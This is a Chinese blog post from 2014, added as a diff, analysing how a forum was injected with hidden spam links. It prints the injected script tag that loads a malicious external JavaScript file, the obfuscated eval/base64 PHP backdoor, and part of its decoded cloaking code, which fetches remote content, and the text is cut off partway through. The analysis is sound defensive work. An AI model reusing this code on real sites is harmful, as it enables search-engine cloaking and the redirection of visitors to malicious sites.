@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8"/>
+    <title>论坛被挂暗链问题分析与解决 | 看看俺 - KanKanAn.com</title>
+    <link rel="shortcut icon" href="/static/favicon.ico" />
+    <link rel="stylesheet" type="text/less" href="../../../style/less/o-blog.less"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="generator" content="o-blog"/>
+    <script src="../../../style/js/less-1.3.0.min.js" type="text/javascript"></script>
+    <script src="../../../style/js/jquery-1.7.1.min.js" type="text/javascript"></script>
+    <script src="../../../style/bootstrap/js/bootstrap-modal.js" type="text/javascript"></script>
+    <script src="../../../style/bootstrap/js/bootstrap-transition.js" type="text/javascript"></script>
+    <script src="../../../style/bootstrap/js/bootstrap-dropdown.js" type="text/javascript"></script>
+    <script src="../../../style/bootstrap/js/bootstrap-collapse.js" type="text/javascript"></script>
+    <script src="../../../style/js/prettify.js" type="text/javascript"></script>
+    <script src="../../../style/js/o-blog.linenumber.js" type="text/javascript"></script>
+    <script src="../../../style/js/o-blog-fix.js" type="text/javascript"></script>
+    
+    
+  </head>
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+	<div class="container">
+	  <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+	  <a class="brand" href="../../../index.html">看看俺 - KanKanAn.com</a>
+	  <div class="nav-collapse collapse">
+	    <ul>
+<li><a href="../../../archives.html"><i>icon-list icon-white</i> 归档</a>
+
+</li>
+<li><a href="../../../tags.html"><i>icon-tags icon-white</i> 标签</a>
+
+</li>
+<li><a href="../../../index.xml"><i>icon-rss icon-white</i> 订阅</a>
+</li>
+</ul>
+
+
+
+	  </div>
+	</div>
+      </div>
+    </div>
+    <div class="container container-fluid" style="padding-top: 60px;">
+      <div class="row-fluid">
+        <div id="page" class="span9">
+
+  <div class="article">
+  <header class="article-header">
+
+    <div class="page-header">
+      <div class="row">
+	<div class="date span1">
+	  <div class=" date-d">01</div>
+	  <div class=" date-m"><a href="../../../posts/2014/04/index.html">4月</a></div>
+	  <div class=" date-y"><a href="../../../posts/2014/index.html">2014</a>
+	  </div>
+	</div>
+	<div class="span1">
+	  <div class="qr-code">
+  <img style="min-width:90px; min-height:90px; max-width:90px; max-height:90px;" src="http://chart.apis.google.com/chart?chs=90x90&cht=qr&chld=|0&chl=http%3A%2F%2Fblog.kankanan.com%2Fposts%2F2014%2F04%2F01_8bba575b88ab6302669794fe95ee9898520667904e0e89e351b3.html"
+       alt="qr-code" />
+</div>
+
+	</div>
+	<h1 class="offset2">论坛被挂暗链问题分析与解决</h1>
+      </div>
+      <nav>
+	<ul class="pager">
+	  <li class="previous"><a href="../../../posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html"><i class="icon-chevron-left"></i>&nbsp;Archlinux网络接口上出现两个IP</a></li><li class="next">&nbsp;</li>
+	</ul>
+      </nav>
+    </div>
+
+  </header>
+  <div class="article-content">
+    <div id="outline-container-1" class="outline-3">
+<h3 id="sec-1">发现问题</h3>
+<div class="outline-text-3" id="text-1">
+
+
+<p>   
+   有网友反映我们的论坛被挂了暗链，具体表现为从 <code>google</code> 搜索论坛名称结果如下图所示：
+</p>
+<p>
+   <img src="file:///home/tangxinfa/Projects/tangxinfa.github.com/static/site_attacked.png"  alt="file:///home/tangxinfa/Projects/tangxinfa.github.com/static/site_attacked.png" />
+</p>
+<p>   
+   直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 <code>google</code> 搜索结果访问会跳到恶意网站，
+</p>
+</div>
+
+</div>
+
+<div id="outline-container-2" class="outline-3">
+<h3 id="sec-2">解决问题</h3>
+<div class="outline-text-3" id="text-2">
+
+
+<p>
+   直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。
+</p>
+<ul>
+<li>在代码和数据库dump结果中搜索恶意站点信息，一无所获。
+
+</li>
+<li>然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 <code>firefox</code> 插件 <code>ImageBlock</code> 让浏览器不加载图片，可是问题依旧。
+
+</li>
+<li>打开 <code>firebug</code> 的 <code>Network</code> 标签，在页面加载记录中发现一个异常的js： <code>http://api.discuz.com.de/Seo.js</code> 
+
+<p>     
+     在代码和数据库中搜索这个js找不到任何信息。
+</p>
+<p>
+     将恶意站点配置一条hosts：
+</p>
+
+
+
+<pre class="example">127.0.0.1 api.discuz.com.de
+</pre>
+
+
+<p>
+     浏览器不再自动跳转到恶意网站了。 
+</p>
+</li>
+<li>从 <code>google</code> 跳转到论坛后，查看页面源代码在最开始部分发现了引入这个js的语句。
+
+
+
+
+<pre class="src src-html">&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">div</span> <span style="color: #eeeeec;">style</span>='display:none'&gt;&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span> <span style="color: #eeeeec;">language</span>='javascript' <span style="color: #eeeeec;">src</span>='http://count31.51yes.com/click.aspx?id=310940343<span style="color: #eeeeec;">&amp;logo</span>=1' <span style="color: #eeeeec;">charset</span>='gb2312'&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span>&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">div</span>&gt;&lt;<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span> <span style="color: #eeeeec;">type</span>='text/javascript' <span style="color: #eeeeec;">src</span>='http://api.discuz.com.de/Seo.js'&gt;&lt;/<span style="color: #edd400; font-weight: bold; font-style: italic;">script</span>&gt;
+</pre>
+
+
+</li>
+<li>在php脚本中加入 <code>echo</code> 语句逐步缩小范围，最终发现问题由下面一条语句引起：
+
+
+
+
+<pre class="src src-php"><span style="color: #729fcf; font-weight: bold;">INCLUDE</span>(<span style="color: #eeeeec; background-color: #2e3436;">pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,<span style="color: #ad7fa8; font-style: italic;">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'</span><span style="text-decoration: underline;">));</span>
+</pre>
+
+
+<p>
+     上面的语句引入了 <code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code> 脚本。
+</p>
+<p>
+     删除该语句后问题解决。
+</p></li>
+</ul>
+
+
+</div>
+
+</div>
+
+<div id="outline-container-3" class="outline-3">
+<h3 id="sec-3">分析恶意代码</h3>
+<div class="outline-text-3" id="text-3">
+
+
+<ul>
+<li><code>/var/tmp/.SYSDUMP/.Wh0AmI.CORE</code>
+
+
+
+
+<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span> $<span style="color: #eeeeec;">O00OO0</span>=<span style="color: #eeeeec; background-color: #2e3436;">urldecode(</span><span style="color: #ad7fa8; font-style: italic;">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2</span><span style="text-decoration: underline;">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?&gt;</span>
+</pre>
+
+
+</li>
+<li>参考 <a href="http://blog.i1728.com/post/99.html">网上的方法</a> 解码的结果
+
+
+
+
+<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span>
+<span style="color: #888a85;">/*</span>
+<span style="color: #888a85;">*author:whoami</span>
+<span style="color: #888a85;">*  QQ  :4892057</span>
+<span style="color: #888a85;">*/</span>
+<span style="color: #eeeeec; background-color: #2e3436;">error_reporting(0</span>);
+$<span style="color: #eeeeec;">fileDir</span> = <span style="color: #ad7fa8; font-style: italic;">'/var/tmp/.SYSDUMP/'</span>;
+$<span style="color: #eeeeec;">IP</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'REMOTE_ADDR'</span>];
+$<span style="color: #eeeeec;">Bot</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_USER_AGENT'</span>];
+$<span style="color: #eeeeec;">Ref</span>=$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_REFERER'</span>];
+$<span style="color: #eeeeec;">KIP</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'117.28.255.37'</span>,<span style="color: #ad7fa8; font-style: italic;">'116.55.241.24'</span>,<span style="color: #ad7fa8; font-style: italic;">'125.64.94.219'</span>,<span style="color: #ad7fa8; font-style: italic;">'119.147.114.213'</span>,<span style="color: #ad7fa8; font-style: italic;">'11</span><span style="text-decoration: underline;">8.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');</span>
+$<span style="color: #eeeeec;">KBot</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Baiduspider'</span>,<span style="color: #ad7fa8; font-style: italic;">'Googlebot'</span>,<span style="color: #ad7fa8; font-style: italic;">'Yahoo'</span>,<span style="color: #ad7fa8; font-style: italic;">'Bingbot'</span>,<span style="color: #ad7fa8; font-style: italic;">'Sosospider'</span>,<span style="color: #ad7fa8; font-style: italic;">'Sogou'</span>,<span style="color: #ad7fa8; font-style: italic;">'36</span><span style="text-decoration: underline;">0Spider','YoudaoBot');</span>
+$<span style="color: #eeeeec;">Key</span>=<span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'anquan.org'</span>,<span style="color: #ad7fa8; font-style: italic;">'google.com'</span>,<span style="color: #ad7fa8; font-style: italic;">'soso.com'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e8%b5%8c'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e9%aa%b0'</span>,<span style="color: #ad7fa8; font-style: italic;">'%e9%b1%</span><span style="text-decoration: underline;">bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');</span>
+<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">dec0de</span>($<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>){
+$<span style="color: #eeeeec;">dataArr</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,$<span style="color: #eeeeec;">data</span>);
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">Keys</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>]))));
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">News</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>]))));
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">Links</span>= <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>,<span style="color: #eeeeec; background-color: #2e3436;">base64_decode(str_rot13(pack(</span><span style="color: #ad7fa8; font-style: italic;">'H*'</span>,$<span style="color: #eeeeec;">dataArr</span>[<span style="color: #eeeeec; background-color: #2e3436;">2</span>]))));
+<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #729fcf; font-weight: bold;">include</span>($<span style="color: #eeeeec;">fileDir</span>.<span style="color: #ad7fa8; font-style: italic;">'.Wh0AmI.MODEL'</span>);<span style="color: #f57900; font-weight: bold;">die</span>;
+}
+<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getdata</span>($<span style="color: #eeeeec;">data_url</span>){
+<span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'curl_exec'</span>)) {
+$<span style="color: #eeeeec;">sp_curl</span> = @<span style="color: #eeeeec; background-color: #2e3436;">curl_init(</span>);
+<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #eeeeec;">data_url</span>);
+<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #eeeeec; background-color: #2e3436;">0</span>);
+<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #eeeeec; background-color: #2e3436;">5</span>);
+<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #eeeeec; background-color: #2e3436;">1</span>);
+$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">curl_exec(</span>$<span style="color: #eeeeec;">sp_curl</span>);
+@<span style="color: #eeeeec; background-color: #2e3436;">curl_close(</span>$<span style="color: #eeeeec;">sp_curl</span>);
+}<span style="color: #729fcf; font-weight: bold;">elseif</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'stream_context_create'</span>)) {
+$<span style="color: #eeeeec;">sp_cont</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'http'</span> =<span style="color: #8ae234;">&gt;</span> <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'method'</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'GET'</span>,<span style="color: #ad7fa8; font-style: italic;">'timeout'</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">5</span>));
+$<span style="color: #eeeeec;">sp_stre</span> = @<span style="color: #eeeeec; background-color: #2e3436;">stream_context_create(</span>$<span style="color: #eeeeec;">sp_cont</span>);
+$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span>$<span style="color: #eeeeec;">data_url</span>, <span style="color: #8ae234;">false</span>, $<span style="color: #eeeeec;">sp_stre</span>);
+}<span style="color: #729fcf; font-weight: bold;">else</span>{
+$<span style="color: #eeeeec;">handle</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">data_url</span>, <span style="color: #ad7fa8; font-style: italic;">"rb"</span>);<span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"> </span>
+$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">stream_get_contents(</span>$<span style="color: #eeeeec;">handle</span>);<span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"> </span>
+@<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">handle</span>);
+}
+<span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">contents</span>;
+}
+<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">show</span>($<span style="color: #eeeeec;">fileDir</span>){
+$<span style="color: #eeeeec;">filename</span>=$<span style="color: #eeeeec;">fileDir</span><span style="color: #f57900; font-weight: bold;">.</span><span style="color: #eeeeec; background-color: #2e3436;">md5(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_HOST'</span>].$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'REQUEST_URI'</span>]);
+<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">is_file(</span>$<span style="color: #eeeeec;">filename</span>)){
